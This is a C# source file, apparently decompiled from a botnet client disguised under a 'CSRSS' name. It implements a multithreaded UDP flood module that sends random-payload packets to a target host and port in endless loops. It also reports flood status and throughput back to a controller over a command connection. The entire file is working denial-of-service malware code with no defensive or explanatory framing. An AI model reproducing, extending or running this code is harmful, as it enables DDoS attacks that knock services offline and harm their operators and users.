using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace MI_CSRSS.floods;

internal class UDP
{
	internal class FloodThreadss
	{
		private IPEndPoint _ep;

		private byte[] _packet;

		private Thread _thisThread;

		public FloodThreadss(IPEndPoint ep, byte[] packet)
		{
			_ep = ep;
			_packet = packet;
			_thisThread = new Thread(_threadLoop);
			_thisThread.Start();
		}

		public void stop()
		{
			try
			{
				_thisThread.Suspend();
			}
			catch
			{
			}
		}

		private void _threadLoop()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = false;
						socket.SendTo(_packet, _ep);
						SendShit += ByteLenth;
						Thread.Sleep(_MSDEL);
					}
				}
				catch
				{
				}
			}
		}
	}

	private static List<FloodThreadss> _floods = new List<FloodThreadss>();

	public static long SendShit = 0L;

	public static long ByteLenth = 0L;

	public static bool IsOn = false;

	private static string _IP;

	private static int _DEST;

	private static int _MSDEL;

	private static Thread speedThread;

	public static void udpfloodstart(string host, int port, int packet, int threads, int delay)
	{
		Connection.SendConnByte("STU~005~" + host + "~" + port + "~" + threads);
		Connection.BusyWithCmds = true;
		_IP = host;
		_DEST = port;
		_MSDEL = delay;
		speedThread = new Thread(SpeedFlooding);
		speedThread.Start();
		byte[] array = new byte[packet];
		Random random = new Random();
		random.NextBytes(array);
		ByteLenth = array.LongLength;
		if (!IsOn)
		{
			IPEndPoint ep;
			try
			{
				ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
			}
			catch
			{
				ep = new IPEndPoint(IPAddress.Parse(host), port);
			}
			IsOn = true;
			for (int i = 0; i < threads; i++)
			{
				_floods.Add(new FloodThreadss(ep, array));
			}
		}
	}

	private static void SpeedFlooding()
	{
		while (true)
		{
			Thread.Sleep(10000);
			Connection.SendConnByte("STU~006~" + _IP + "~" + _DEST + "~" + SendShit / 10L);
			SendShit = 0L;
		}
	}

	public static void stopudpfloody()
	{
		IsOn = false;
		Connection.BusyWithCmds = false;
		Connection.SendConnByte("STU~007");
		try
		{
			speedThread.Suspend();
		}
		catch
		{
		}
		foreach (FloodThreadss flood in _floods)
		{
			flood.stop();
		}
		Thread.Sleep(5000);
		Connection.SendConnByte("STU~000");
	}
}
